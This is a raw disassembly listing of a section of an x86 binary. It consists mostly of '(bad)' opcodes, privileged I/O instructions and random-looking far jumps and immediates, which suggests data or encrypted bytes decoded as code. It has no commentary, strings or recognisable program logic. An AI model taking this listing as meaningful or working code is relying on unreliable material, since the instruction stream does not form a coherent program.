  40b45a:	lock imul bh
  40b45d:	vshufps ymm7,ymm4,ymm1,0xbd
  40b462:	rcr    esp,1
  40b464:	(bad)  
  40b466:	in     eax,dx
  40b467:	add    ah,bl
  40b469:	add    bl,bh
  40b46b:	rol    DWORD PTR [ecx],cl
  40b46d:	ftst   
  40b46f:	in     al,0xee
  40b471:	hlt    
  40b472:	add    ebp,ebp
  40b474:	jmp    0xbcc0:0xd1cdc4c0
  40b47b:	loopne 0x40b464
  40b47d:	mov    dl,0xee
  40b47f:	aad    0xeb
  40b481:	mov    esi,0xcdfecff0
  40b486:	out    dx,eax
  40b487:	(bad)  
  40b488:	xlat   BYTE PTR ds:[ebx]
  40b489:	mov    ebx,0xf4e3f3d6
  40b48e:	jmp    esp
  40b490:	(bad)  
  40b491:	std    
  40b492:	enter  0xcbea,0xf3
  40b496:	retf   
  40b497:	jmp    0xc5129c6c
  40b49c:	cmc    
  40b49d:	retf   0xfad2
  40b4a0:	cli    
  40b4a1:	fucompp 
  40b4a3:	fstp   st(6)
  40b4a5:	sar    BYTE PTR [edi+eax*8-0x38fc0700],cl
  40b4ac:	mov    eax,0xe60bf8c9
  40b4b1:	push   cs
  40b4b2:	add    BYTE PTR [esi],al
  40b4b4:	in     al,0xf2
  40b4b6:	in     al,dx
  40b4b7:	icebp  
  40b4b8:	(bad)  
  40b4b9:	jmp    0x40b4ac
  40b4bb:	out    0xd1,eax
  40b4bd:	out    0xd9,eax
  40b4bf:	(bad)
  40b4c2:	enter  0xe3e2,0x2
  40b4c6:	sti    
  40b4c7:	add    dh,cl
  40b4c9:	not    eax
  40b4cb:	ret    
  40b4cc:	loope  0x40b4a2
  40b4ce:	add    bh,bl
  40b4d0:	stc    
  40b4d1:	in     al,0x9
  40b4d3:	cli    
  40b4d4:	pop    es
  40b4d5:	rcl    bl,0xc4
  40b4d8:	aad    0xee
  40b4da:	loope  0x40b4c7
  40b4dc:	mov    cl,0xcd
  40b4de:	stc    
  40b4df:	fidivr DWORD PTR [edx-0xc460927]
  40b4e5:	into   
  40b4e6:	add    bl,ch
  40b4e8:	mov    eax,0xf1d6ddd5
  40b4ed:	(bad)  
  40b4ee:	or     dh,dh
  40b4f0:	(bad)  
  40b4f1:	leave  
  40b4f2:	or     al,0xcb
  40b4f4:	clc    
  40b4f5:	icebp  
  40b4f6:	in     al,dx
  40b4f7:	ret    
  40b4f8:	mul    dl
  40b4fa:	mov    cl,0xb0
  40b4fc:	aam    0xf0
  40b4fe:	mov    cl,0xec
  40b500:	in     eax,0xda
  40b502:	std    
  40b503:	into   
  40b504:	mov    edi,0xd4f7f1d0
  40b509:	sti    
  40b50a:	push   es
  40b50b:	ror    ebx,1
  40b50d:	lds    eax,FWORD PTR [eax]
  40b50f:	cld    
  40b510:	(bad)  
  40b511:	fstp   st(5)
  40b513:	stc    
  40b514:	cli    
  40b515:	retf   
  40b516:	rcr    dh,1
  40b518:	in     al,0xc6
  40b51a:	xlat   BYTE PTR ds:[ebx]
  40b51b:	(bad)  
  40b51c:	in     al,0xd8
  40b51e:	out    dx,eax
  40b51f:	lods   eax,DWORD PTR ds:[esi]
  40b520:	ror    bl,1
  40b522:	sar    esp,1
  40b524:	xlat   BYTE PTR ds:[ebx]
  40b525:	cli    
  40b526:	(bad)  
  40b528:	jecxz  0x40b4ec
  40b52a:	fcomip st,st(4)
  40b52c:	add    al,0xea
  40b52e:	loope  0x40b4f8
  40b530:	into   
  40b531:	add    al,0xe
  40b533:	call   0xc9139a37
  40b538:	ror    dh,cl
  40b53a:	repz lds esi,FWORD PTR [esi-0x4a30320e]
  40b541:	idiv   eax
  40b543:	aad    0xf3
  40b545:	shl    bl,1
  40b547:	sti    
  40b548:	repnz repz clc 
  40b54b:	retf   
  40b54c:	clc    
  40b54d:	(bad)  
  40b54e:	sti    
  40b54f:	in     al,0xe2
  40b551:	stc    
  40b552:	jmp    0x40b55c
  40b554:	jmp    0xc9327f1d
  40b559:	imul   ah
  40b55b:	jmp    0xb712af2e
  40b560:	imul   al
  40b562:	aam    0xf3
  40b564:	cld    
  40b565:	int    0xf6
  40b567:	pop    es
  40b568:	add    eax,edx
  40b56a:	shl    eax,0xf8
  40b56d:	ror    al,0x3
  40b570:	aad    0x3
  40b572:	add    al,0xe5
  40b574:	or     ah,dh
  40b576:	repz frstor [esi+esi*4-0x3a4d1c4b]
  40b57e:	shl    BYTE PTR [esi-0x272d41],1
  40b584:	mov    ebx,0xc2cef2e2
  40b589:	mov    esi,0xc5e1bcec
  40b58e:	sar    ch,1
  40b590:	add    BYTE PTR [esi],cl
  40b592:	int    0xfd
  40b594:	cld    
  40b595:	test   eax,0xabc6ccc9
  40b59a:	sti    
  40b59b:	mov    bl,0xc9
  40b59d:	(bad)  
  40b59e:	aam    0xd9
  40b5a0:	mov    ebx,0xf0f5ccdd
  40b5a5:	aad    0xf9
  40b5a7:	fstp   TBYTE PTR [ebp-0xb04000f]
  40b5ad:	add    eax,0x3db0801
  40b5b2:	cld    
  40b5b3:	fcmovne st,st(5)
  40b5b5:	mov    eax,0xefc8c1d8
  40b5ba:	mov    bh,0xb1
  40b5bc:	shl    dh,cl
  40b5be:	(bad)  
  40b5bf:	mov    ch,0xf1
  40b5c1:	iret   
  40b5c2:	hlt    
  40b5c3:	jecxz  0x40b5a1
  40b5c5:	add    edx,edx
  40b5c7:	cld    
  40b5c8:	mov    ebp,0xe6f4c5fd
  40b5cd:	cli    
  40b5ce:	jmp    0x1300:0xe7c808ea
  40b5d5:	stos   BYTE PTR es:[edi],al
  40b5d6:	repnz into 
  40b5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d9:	leave  
  40b5da:	fdiv   QWORD PTR [edi-0x2e132f05]
  40b5e0:	mov    eax,0xd8f8d7b9
  40b5e5:	mov    edi,0xfddfc7d5
  40b5ea:	aad    0xc1
  40b5ec:	jecxz  0x40b5d7
  40b5ee:	fmulp  st(1),st
  40b5f0:	call   0x123ac3d0
  40b5f5:	mov    bl,0xac
  40b5f7:	int3   
  40b5f8:	into   
  40b5f9:	loopne 0x40b5ac
  40b5fb:	(bad)  
  40b5fc:	aad    0xb4
  40b5fe:	mov    eax,0xbec5daf6
  40b603:	lock loop 0x40b5fb
  40b606:	shl    dh,cl
  40b608:	std    
  40b609:	add    cl,al
  40b60b:	inc    ecx
  40b60d:	rcr    edx,1
  40b60f:	aam    0xdf
  40b611:	(bad)  
  40b612:	call   0xc2eb76f1
  40b617:	lock call 0xa9239f07
  40b61d:	shl    DWORD PTR [eax-0x490a3a09],1
  40b623:	idiv   BYTE PTR [edi-0x222e460d]
  40b629:	(bad)  
  40b62a:	fild   DWORD PTR [eax]
  40b62c:	cmc    
  40b62d:	mul    edi
  40b62f:	shl    dh,0xb
  40b632:	iret   
  40b633:	adc    cl,BYTE PTR [ecx]
  40b635:	lods   al,BYTE PTR ds:[esi]
  40b636:	retf   
  40b637:	fdivrp st(3),st
  40b639:	(bad)  
  40b63a:	mov    al,0xe9
  40b63c:	in     al,dx
  40b63d:	fcomi  st,st(4)
  40b63f:	vpor   ymm5,ymm2,ymm0
  40b643:	fcmove st,st(2)
  40b645:	mov    bh,0xcd
  40b647:	(bad)  
  40b648:	std    
  40b649:	(bad)  
  40b64a:	(bad)  
  40b64b:	stc    
  40b64c:	add    al,0xdd
  40b64e:	add    ecx,eax
  40b650:	aad    0xe4
  40b652:	in     eax,0xd3
  40b654:	out    dx,eax
  40b655:	loop   0x40b646
  40b657:	in     al,0xd7
  40b659:	lods   eax,DWORD PTR ds:[esi]
  40b65a:	shl    DWORD PTR [edi-0x4b170439],1
  40b660:	push   DWORD PTR [ebp-0x6094441]
  40b666:	into   
  40b667:	add    edi,edi
  40b669:	aam    0xc1
  40b66b:	pop    es
  40b66c:	loopne 0x40b64a
  40b66e:	(bad)  
  40b670:	or     eax,0xfde0c5dc
  40b675:	jmp    0x40b659
  40b677:	sar    BYTE PTR [ebp-0x3e152f51],0xe0
  40b67e:	into   
  40b67f:	retf   0xb5ac
  40b682:	int3   
  40b683:	shl    al,cl
  40b685:	call   0xc3229847
  40b68a:	push   es
  40b68b:	add    esp,edi
  40b68d:	rcl    ebp,1
  40b68f:	add    al,0xc4
  40b691:	(bad)  
  40b692:	loopne 0x40b672
  40b694:	iret   
  40b695:	in     al,0xb8
  40b697:	in     al,dx
  40b698:	mov    bh,0xb7
  40b69a:	aam    0xb6
  40b69c:	loop   0x40b64e
  40b69e:	mov    dh,0xd2
  40b6a0:	mov    eax,0xcaf4eddf
  40b6a5:	std    
  40b6a6:	iret   
  40b6a7:	out    0xc1,eax
  40b6a9:	std    
  40b6aa:	fsubrp st(2),st
  40b6ac:	sti    
  40b6ad:	loope  0x40b69a
  40b6af:	add    al,0xdc
  40b6b1:	or     esp,esi
  40b6b3:	retf   0xc8ff
  40b6b6:	int3   
  40b6b7:	ret    0xd3e4
  40b6ba:	sar    DWORD PTR [ebx-0x2628073e],cl
  40b6c0:	lods   al,BYTE PTR ds:[esi]
  40b6c1:	aad    0xf8
  40b6c3:	int3   
  40b6c4:	sar    DWORD PTR [ecx-0x231d0f31],cl
  40b6ca:	mov    eax,0xca04f4d0
  40b6d0:	add    al,0x3
  40b6d2:	fmulp  st(7),st
  40b6d4:	jecxz  0x40b693
  40b6d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6d7:	mov    ebp,0xf6c5ecf3
  40b6dc:	loope  0x40b6b5
  40b6de:	aam    0xc4
  40b6e0:	int3   
  40b6e1:	int    0xca
  40b6e3:	mov    eax,0xfdefdad4
  40b6e8:	mov    ebp,0xdae2c006
  40b6ed:	ftst   
  40b6ef:	push   cs
  40b6f0:	add    ecx,ecx
  40b6f2:	add    esi,edi
  40b6f4:	ftst   
  40b6f6:	ffree  st(3)
  40b6f8:	in     eax,dx
  40b6f9:	mov    esp,0xf4f3efb3
  40b6fe:	into   
  40b6ff:	jmp    0xf6309ce2
  40b704:	idiv   DWORD PTR [ebx-0x331d2c13]
  40b70a:	loope  0x40b6dd
  40b70c:	add    al,0xd9
  40b70e:	jmp    0x12cb:0xe8eb08ef
  40b715:	mov    ebp,0xdcf0bce0
  40b71a:	lods   al,BYTE PTR ds:[esi]
  40b71b:	rol    ah,cl
  40b71d:	loope  0x40b712
  40b71f:	icebp  
  40b720:	lods   al,BYTE PTR ds:[esi]
  40b721:	cli    
  40b722:	mov    ecx,0xd9fbfbb1
  40b727:	repnz in eax,0xdd
  40b72a:	idiv   dh
  40b72c:	out    0xbf,al
  40b72e:	ror    cl,1
  40b730:	fadd   QWORD PTR [eax]
  40b732:	fmulp  st(3),st
  40b734:	(bad)  
  40b736:	mov    dl,0xef
  40b738:	mov    bh,0xf5
  40b73a:	test   cl,0xda
  40b73d:	mov    ch,0xca
  40b73f:	mov    bh,0xdb
  40b741:	repnz mov ebp,0xe8c2bfcd
  40b747:	into   
  40b748:	sar    cl,cl
  40b74a:	(bad)  
  40b74b:	icebp  
  40b74c:	in     al,0xd9
  40b74e:	fld    st(1)
  40b750:	out    0xe5,eax
  40b752:	add    al,0xea
  40b754:	out    0xea,eax
  40b756:	rep lods eax,DWORD PTR ds:[esi]
  40b758:	out    0xd6,al
  40b75a:	shl    BYTE PTR [edi-0x33470749],0xb0
  40b761:	out    dx,al
  40b762:	leave  
  40b763:	aad    0xbe
  40b765:	xlat   BYTE PTR ds:[ebx]
  40b766:	cmc    
  40b767:	idiv   BYTE PTR [esi-0x29343afc]
  40b76d:	mov    edi,0x2e6f4c7
  40b772:	push   es
  40b773:	or     al,0x8
  40b775:	test   eax,0xccd6d0ca
  40b77a:	in     eax,dx
  40b77b:	sti    
  40b77c:	out    dx,eax
  40b77d:	shl    bh,1
  40b77f:	in     al,dx
  40b780:	cli    
  40b781:	mov    bl,0xf0
  40b783:	cmc    
  40b784:	call   0xe13fa75d
  40b789:	aad    0xdc
  40b78b:	fucom  st(1)
  40b78d:	(bad)  
  40b78e:	jmp    0xfe4bb179
  40b793:	sti    
  40b794:	clc    
  40b795:	icebp  
  40b796:	in     eax,dx
  40b797:	out    dx,al
  40b798:	fsubrp st(1),st
  40b79a:	mov    dh,0xc7
  40b79d:	(bad)
  40b7a0:	into   
  40b7a1:	mov    ebp,0xff01e8b2
  40b7a6:	pop    es
  40b7a7:	ret    
  40b7a8:	div    bl
  40b7aa:	mov    ebp,0xc0d609c7
  40b7af:	mov    ebp,0xf904ddf8
  40b7b4:	pop    es
  40b7b5:	ret    
  40b7b6:	int    0xb2
  40b7b8:	lods   al,BYTE PTR ds:[esi]
  40b7b9:	out    dx,eax
  40b7ba:	jmp    0xf625ab6c
  40b7bf:	out    dx,al
  40b7c0:	clc    
  40b7c1:	sar    DWORD PTR [edx-0x220efd04],cl
  40b7c7:	fst    st(7)
  40b7c9:	(bad)  
  40b7cb:	dec    DWORD PTR [edx]
  40b7cd:	clc    
  40b7ce:	aam    0xf8
  40b7d0:	push   es
  40b7d1:	or     ch,bl
  40b7d3:	loop   0x40b7e1
  40b7d5:	(bad)  
  40b7d6:	mov    ebp,0xe4ece0e9
  40b7db:	in     eax,dx
  40b7dc:	(bad)  
  40b7de:	out    0xbb,eax
  40b7e0:	(bad)  
  40b7e1:	(bad)  
  40b7e2:	in     eax,dx
  40b7e3:	leave  
  40b7e4:	cmc    
  40b7e5:	cmc    
  40b7e6:	mov    ebp,0x4d1d1ee
  40b7eb:	cli    
  40b7ec:	icebp  
  40b7ed:	(bad)  
  40b7ef:	fsubp  st(2),st
  40b7f1:	add    eax,0xea0cddda
  40b7f6:	loope  0x40b7cf
  40b7f8:	mov    bh,0xec
  40b7fa:	xlat   BYTE PTR ds:[ebx]
  40b7fb:	icebp  
  40b7fc:	shr    bh,cl
  40b7fe:	inc    ebp
  40b800:	fidivr WORD PTR [ebp+0xceeab6]
  40b806:	enter  0xd8df,0xfa
  40b80a:	aam    0xde
  40b80c:	push   es
  40b80d:	hlt    
  40b80e:	retf   0xc6c7
  40b811:	jmp    0x40b818
  40b813:	jmp    0x40b7e1
  40b815:	jecxz  0x40b801
  40b817:	iret   
  40b818:	out    0xad,al
  40b81a:	in     al,0xee
  40b81c:	(bad)  
  40b81d:	xlat   BYTE PTR ds:[ebx]
  40b81e:	stc    
  40b81f:	in     al,dx
  40b820:	rcr    bl,cl
  40b822:	fsubp  st(5),st
  40b824:	push   eax
  40b826:	lock sar edx,cl
  40b829:	xlat   BYTE PTR ds:[ebx]
  40b82a:	sar    al,0xf6
  40b82d:	add    eax,0xdcc0e8c7
  40b832:	(bad)
  40b836:	mov    edi,0xe8e8b7b2
  40b83b:	sti    
  40b83c:	ret    0xc7ed
  40b83f:	stc    
  40b840:	sti    
  40b841:	mov    ah,0xdc
  40b843:	shl    bl,cl
  40b845:	mov    ebp,0xda03daec
  40b84a:	mov    dh,0xe4
  40b84d:	out    0xd8,eax
  40b84f:	jecxz  0x40b849
  40b851:	jecxz  0x40b85f
  40b853:	into   
  40b854:	std    
  40b855:	repnz retf 0xa8ee
  40b859:	xlat   BYTE PTR ds:[ebx]
  40b85a:	scas   al,BYTE PTR es:[edi]
  40b85b:	int    0xd7
  40b85d:	out    0xd4,al
  40b85f:	cmc    
  40b860:	xlat   BYTE PTR ds:[ebx]
  40b861:	aad    0xde
  40b863:	mov    ecx,0xecfdcee9
  40b868:	fiadd  WORD PTR [esi]
  40b86a:	repnz add al,BYTE PTR [edx]
  40b86d:	cli    
  40b86e:	jmp    0xae2:0xf3eae7fd
  40b875:	rcl    bh,1
  40b877:	fcomip st,st(3)
  40b879:	xlat   BYTE PTR ds:[ebx]
  40b87a:	rol    dl,0xbb
  40b87d:	sti    
  40b87e:	mov    bh,0xb5
  40b880:	shl    esi,cl
  40b882:	fxch   st(7)
  40b884:	mov    al,0xf0
  40b886:	(bad)  
  40b887:	shl    ebx,cl
  40b889:	mov    esp,0xc0e4c7be
  40b88e:	jmp    0xee078c97
  40b893:	or     al,BYTE PTR ds:0xe8f3a8e8
  40b899:	icebp  
  40b89a:	retf   0xccc6
  40b89d:	mov    ch,0xf5
  40b89f:	shl    edi,cl
  40b8a1:	sti    
  40b8a2:	aad    0xbf
  40b8a4:	(bad)  
  40b8a6:	(bad)  
  40b8a7:	stc    
  40b8a8:	fdiv   st,st(4)
  40b8aa:	loope  0x40b8a9
  40b8ac:	sti    
  40b8ad:	fdiv   st(0),st
  40b8af:	pop    es
  40b8b0:	retf   0xc6ec
  40b8b3:	sti    
  40b8b4:	adc    eax,edx
  40b8b6:	rol    eax,1
  40b8b8:	(bad)  
  40b8b9:	call   0xf8258374
  40b8be:	mul    edi
  40b8c0:	aam    0xfa
  40b8c2:	cli    
  40b8c3:	fcmovu st,st(7)
  40b8c5:	cli    
  40b8c6:	sti    
  40b8c7:	push   ebx
  40b8c9:	out    0xf8,al
  40b8cb:	jecxz  0x40b8ab
  40b8cd:	jmp    0xc9e9:0xf4cfbd04
  40b8d4:	retf   0xbdee
  40b8d7:	mov    esp,0xb5efb5ce
  40b8dc:	mov    edx,0xd2b6e9e9
  40b8e1:	into   
  40b8e2:	into   
  40b8e3:	mov    cl,0xcc
  40b8e5:	loope  0x40b8c4
  40b8e7:	out    0xbf,eax
  40b8e9:	mov    esp,0xc2dbe2c0
  40b8ee:	retf   
  40b8ef:	out    dx,eax
  40b8f0:	stc    
  40b8f1:	in     eax,0xdb
  40b8f3:	call   0xc5016bf1
  40b8f8:	mov    cl,0xf3
  40b8fa:	(bad)  [ebx-0x1a003a16]
  40b900:	(bad)  
  40b901:	cli    
  40b902:	leave  
  40b903:	fucomp st(7)
  40b905:	jecxz  0x40b8ef
  40b907:	mov    eax,0xfef8ccf3
  40b90c:	loope  0x40b90a
  40b90e:	or     DWORD PTR [edx],eax
  40b910:	or     cl,BYTE PTR ds:0xc7cadbc4
  40b916:	repz mul esi
  40b919:	in     al,dx
  40b91a:	xlat   BYTE PTR ds:[ebx]
  40b91b:	cli    
  40b91c:	repnz icebp 
  40b91e:	(bad)
  40b921:	mov    bh,0xd5
  40b923:	iret   
  40b924:	mov    ebx,0xc3bcccfe
  40b929:	std    
  40b92a:	mov    esp,0xdbf1dde7
  40b92f:	cmc    
  40b930:	or     bh,ch
  40b932:	mov    BYTE PTR [esi],0x2
  40b935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b936:	mov    esi,0xd2f7ced6
  40b93b:	aad    0xe0
  40b93d:	in     al,dx
  40b93e:	clc    
  40b93f:	in     al,dx
  40b940:	cli    
  40b941:	mov    dh,0xd9
  40b943:	repz retf 0xcccc
  40b947:	cld    
  40b948:	repnz loop 0x40b948
  40b94b:	(bad)  
  40b94c:	loope  0x40b954
  40b94e:	retf   
  40b94f:	out    0xb,al
  40b951:	leave  
  40b952:	(bad)  
  40b954:	or     eax,edi
  40b956:	out    dx,eax
  40b957:	jmp    0xecda:0xe1d4d6cd
  40b95e:	stc    
  40b95f:	in     eax,dx
  40b960:	jmp    0xf8d3:0xbb03b2fd
  40b967:	mov    ch,0xd0
  40b969:	(bad)  
  40b96a:	mov    esp,0xf9e5cbb9
  40b96f:	or     bl,cl
  40b971:	or     BYTE PTR [edi],cl
  40b973:	jmp    0x40b978
  40b975:	shl    dl,cl
  40b977:	mov    cl,0xd1
  40b979:	retf   0xbbf6
  40b97c:	mov    ch,0xf4
  40b97e:	div    DWORD PTR [ecx-0x252e2622]
  40b984:	(bad)  
  40b986:	div    ecx
  40b988:	sar    cl,0xe7
  40b98b:	push   es
  40b98c:	shl    dh,1
  40b98e:	add    al,0x9
  40b990:	add    eax,DWORD PTR [ebx]
  40b992:	cli    
  40b993:	add    esp,esp
  40b995:	fld1   
  40b997:	jmp    0x40b94c
  40b999:	cmc    
  40b99a:	lods   eax,DWORD PTR ds:[esi]
  40b99b:	ret    
  40b99c:	sar    BYTE PTR [ebx-0x22192b20],1
  40b9a2:	clc    
  40b9a3:	out    dx,eax
  40b9a4:	jmp    0xe1ed:0xdd00bcb9
  40b9ab:	pop    es
  40b9ac:	vpsubusb xmm7,xmm7,xmm3
  40b9b0:	push   cs
  40b9b1:	or     al,0xfe
  40b9b3:	push   cs
  40b9b4:	or     eax,0xb0aeb0e5
  40b9b9:	aad    0xe7
  40b9bb:	in     al,0xcb
  40b9bd:	icebp  
  40b9be:	shr    esp,cl
  40b9c0:	fcomi  st,st(6)
  40b9c2:	aad    0xd0
  40b9c4:	mov    ah,0xcd
  40b9c6:	aad    0xc7
  40b9c8:	jecxz  0x40b9aa
  40b9ca:	(bad)  
  40b9cc:	mov    eax,0xdee408e3
  40b9d1:	add    eax,ebp
  40b9d3:	in     al,dx
  40b9d4:	fnstsw ax
  40b9d6:	fmul   st(6),st
  40b9d8:	out    dx,al
  40b9d9:	call   0xc21cacaf
  40b9de:	retf   0xc6cd
  40b9e1:	mov    eax,0xfa0103f1
  40b9e6:	int    0xfd
  40b9e8:	repnz clc 
  40b9ea:	icebp  
  40b9eb:	out    0xe3,al
  40b9ed:	jmp    0xe53c7fd0
  40b9f2:	repz call 0xa63265d7
  40b9f8:	jecxz  0x40b9ea
  40b9fa:	mov    bl,0xe3
  40b9fc:	mov    ch,0xcb
  40b9fe:	jmp    0xd9dd:0xbec5c6d4
  40ba05:	cli    
  40ba06:	fdivr  DWORD PTR [ebp-0x150f2401]
  40ba0c:	ret    
  40ba0d:	sti    
  40ba0e:	(bad)
  40ba11:	aam    0xf8
  40ba13:	adc    ebx,esi
  40ba15:	loopne 0x40b9c1
  40ba17:	retf   0xe6c3
  40ba1a:	iret   
  40ba1b:	in     eax,0xc1
  40ba1d:	aam    0xc0
  40ba1f:	fidiv  WORD PTR [ebx+ecx*8-0x4010c4b]
  40ba26:	rcr    bl,0xbc
  40ba29:	in     al,dx
  40ba2a:	mov    edx,0xf7c902fb
  40ba2f:	pmullw mm4,mm7
  40ba32:	inc    DWORD PTR [edx]
  40ba34:	fstp   st(4)
  40ba36:	jmp    0xa8fa:0xd0ede4b7
  40ba3d:	icebp  
  40ba3e:	idiv   al
  40ba40:	rcr    dh,1
  40ba42:	hlt    
  40ba43:	ror    edi,1
  40ba45:	call   0x3408e24
  40ba4a:	add    ah,ch
  40ba4c:	or     esp,eax
  40ba4e:	(bad)  
  40ba4f:	jmp    0x40ba1b
  40ba51:	pop    es
  40ba52:	add    eax,0xf3f10efe
  40ba57:	repnz test al,0xf3
  40ba5a:	int    0xc3
  40ba5c:	mov    cl,0xf2
  40ba5e:	sar    edx,1
  40ba60:	jmp    0xff3c8d57
  40ba65:	cld    
  40ba66:	mov    ebp,0x4dcd6c2
  40ba6b:	out    0xe6,eax
  40ba6d:	xlat   BYTE PTR ds:[ebx]
  40ba6e:	add    ch,dh
  40ba70:	sti    
  40ba71:	stc    
  40ba72:	retf   0x302
  40ba75:	retf   0xe9b1
  40ba78:	shr    ebx,1
  40ba7a:	(bad)  
  40ba7b:	call   0xeb019c4c
  40ba80:	out    dx,al
  40ba81:	out    dx,al
  40ba82:	rcr    dl,1
  40ba84:	mov    ebp,0xd6ddd4f5
  40ba89:	ret    
  40ba8a:	icebp  
  40ba8b:	mov    esp,0xd4faffea
  40ba90:	iret   
  40ba91:	iret   
  40ba92:	stc    
  40ba93:	or     ebp,ebp
  40ba95:	retf   
  40ba96:	fadd   st(3),st
  40ba98:	iret   
  40ba99:	lods   al,BYTE PTR ds:[esi]
  40ba9a:	div    BYTE PTR [ebx-0x25390d30]
  40baa0:	cmc    
  40baa1:	int3   
  40baa2:	(bad)  
  40baa3:	cmc    
  40baa4:	hlt    
  40baa5:	cmc    
  40baa6:	out    0xc1,eax
  40baa8:	mov    ebp,0xb8e0dbe5
  40baad:	shr    al,1
  40baaf:	shl    bl,0x4
  40bab2:	or     cl,BYTE PTR [ecx]
  40bab4:	add    BYTE PTR [eax-0x30124c51],ch
  40baba:	mov    ch,0xc2
  40babc:	mov    dh,0xb9
  40babe:	ror    ebx,cl
  40bac0:	(bad)  
  40bac2:	lock rcr cl,cl
  40bac5:	std    
  40bac6:	pop    es
  40bac7:	sar    BYTE PTR [eax-0x3202025],cl
  40bacd:	(bad)  
  40bacf:	out    dx,eax
  40bad0:	loop   0x40ba97
  40bad2:	stc    
  40bad3:	adc    al,BYTE PTR [edx]
  40bad5:	mov    edi,0xe3cbaddd
  40bada:	mov    bl,0xe2
  40badc:	mov    dl,0xee
  40bade:	sti    
  40badf:	jmp    0xd8448adb
  40bae4:	ret    0xb6e8
  40bae7:	mov    esp,0xf9c7d0ec
  40baec:	fcmovb st,st(4)
  40baee:	loopne 0x40bac4
  40baf0:	mov    esp,0xf100eecd
  40baf5:	mov    eax,0xb5b6afdc
  40bafa:	ret    
  40bafb:	enter  0xf3d3,0xee
  40baff:	retf   
  40bb00:	(bad)  
  40bb02:	mov    dh,0xc9
  40bb04:	add    cl,dh
  40bb06:	mov    eax,0xd6fedde0
  40bb0b:	fimul  WORD PTR [ecx]
  40bb0d:	or     edi,ebp
  40bb0f:	(bad)  
  40bb10:	in     eax,0xca
  40bb12:	fadd   DWORD PTR [ebx]
  40bb14:	or     esp,esp
  40bb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb17:	les    ebp,FWORD PTR [eax-0x44520b52]
  40bb1d:	shl    ch,cl
  40bb1f:	dec    dh
  40bb21:	fcmovnu st,st(2)
  40bb23:	fmul   st(0),st
  40bb25:	fdiv   st,st(4)
  40bb27:	icebp  
  40bb28:	(bad)  
  40bb29:	repz (bad) 
  40bb2c:	in     al,0xde
  40bb2e:	jmp    0x40bb30
  40bb30:	(bad)  
  40bb31:	fld    DWORD PTR [edx]
  40bb33:	ror    esp,cl
  40bb35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb36:	ror    ah,cl
  40bb38:	loop   0x40bb0e
  40bb3a:	shlx   edx,edi,edi
  40bb3f:	test   ah,0xdf
  40bb42:	cli    
  40bb43:	jmp    0xd61a8a3d
  40bb48:	add    ah,dl
  40bb4a:	loopne 0x40bb48
  40bb4c:	jmp    0x92f972f
  40bb51:	retf   0xcde2
  40bb54:	add    eax,0xb7adb1c3
  40bb59:	mov    ebp,0xbad9ceed
  40bb5e:	sti    
  40bb5f:	in     eax,dx
  40bb60:	rol    ah,1
  40bb62:	fcomi  st,st(7)
  40bb64:	loop   0x40bb5f
  40bb66:	fsub   st,st(3)
  40bb68:	(bad)  
  40bb69:	out    0xeb,eax
  40bb6b:	repnz std 
  40bb6d:	retf   0xff0b
  40bb70:	pop    es
  40bb71:	call   0xb326ba7a
  40bb76:	iret   
  40bb77:	in     eax,dx
  40bb78:	(bad)
  40bb7b:	aad    0xe1
  40bb7d:	mov    ebx,0xd9ffb9ee
  40bb82:	fstp   st(4)
  40bb84:	retf   0xe003
  40bb87:	cli    
  40bb88:	div    al
  40bb8a:	ret    
  40bb8b:	jecxz  0x40bb84
  40bb8d:	retf   
  40bb8e:	add    eax,esi
  40bb90:	fimul  DWORD PTR [ecx]
  40bb92:	jecxz  0x40bb80
  40bb94:	push   cs
  40bb95:	jmp    0xe4eea968
  40bb9a:	fcmovnb st,st(7)
  40bb9c:	enter  0xb0d4,0xf6
  40bba0:	repz (bad) 
  40bba3:	add    bh,dl
  40bba5:	out    dx,eax
  40bba6:	repnz (bad) 
  40bba9:	shl    dl,1
  40bbab:	out    0xd5,eax
  40bbad:	(bad)
  40bbb0:	fdivr  st,st(5)
  40bbb2:	add    DWORD PTR [ebx*8-0x51521641],ecx
  40bbb9:	retf   
  40bbba:	leave  
  40bbbb:	test   eax,0xd0cfe0cb
  40bbc0:	out    0xbd,al
  40bbc2:	div    ebx
  40bbc4:	in     al,dx
  40bbc5:	(bad)  
  40bbc6:	mov    esp,0xf4e405f8
  40bbcb:	lds    edi,FWORD PTR [eax+0xddad906]
  40bbd1:	loop   0x40bbb9
  40bbd3:	lds    ecx,FWORD PTR ds:0xd6d1d8b2
  40bbd9:	mov    dh,0xc5
  40bbdb:	mov    cl,0xfa
  40bbdd:	cli    
  40bbde:	enter  0xcef8,0xd8
  40bbe2:	sar    DWORD PTR [edx-0x8182e2f],1
  40bbe8:	shl    esi,0xf9
  40bbeb:	(bad)
  40bbee:	cmc    
  40bbef:	vpor   ymm2,ymm4,ymm4
  40bbf3:	fdivp  st(2),st
  40bbf5:	in     al,0xd8
  40bbf7:	test   eax,0xf3aac2cf
  40bbfc:	mov    ah,0xe8
  40bbfe:	ror    esp,cl
  40bc00:	jmp    0xf50f80ee
  40bc05:	mov    esi,0xdff1f3d3
  40bc0a:	repz jecxz 0x40bbdd
  40bc0d:	idiv   ah
  40bc0f:	jmp    0xca44be1d
  40bc14:	or     al,0xb3
  40bc16:	fsubrp st(5),st
  40bc18:	fnstsw WORD PTR [edx+eiz*8-0x2c2a090e]
  40bc1f:	mov    edx,0xf7e3dcec
  40bc24:	aad    0xb8
  40bc26:	mov    ecx,0xd3bbecbc
  40bc2b:	add    al,0xa
  40bc2d:	ret    
  40bc2e:	fsub   st,st(5)
  40bc30:	call   0xdb27c213
  40bc35:	(bad)  
  40bc36:	retf   0xd3c4
  40bc39:	retf   0xdab3
  40bc3c:	loope  0x40bbf2
  40bc3e:	(bad)  
  40bc3f:	mov    cl,0xf4
  40bc41:	leave  
  40bc42:	enter  0xbfec,0xfa
  40bc46:	jmp    eax
  40bc48:	int    0xd2
  40bc4a:	in     al,0xa
  40bc4c:	out    0xf8,eax
  40bc4e:	enter  0xdbe4,0xa
  40bc52:	in     eax,dx
  40bc53:	cld    
  40bc54:	add    dh,ah
  40bc56:	shl    cl,0xd6
  40bc59:	mov    bh,0xc6
  40bc5b:	(bad)  
  40bc5c:	iret   
  40bc5d:	iret   
  40bc5e:	(bad)  
  40bc5f:	int3   
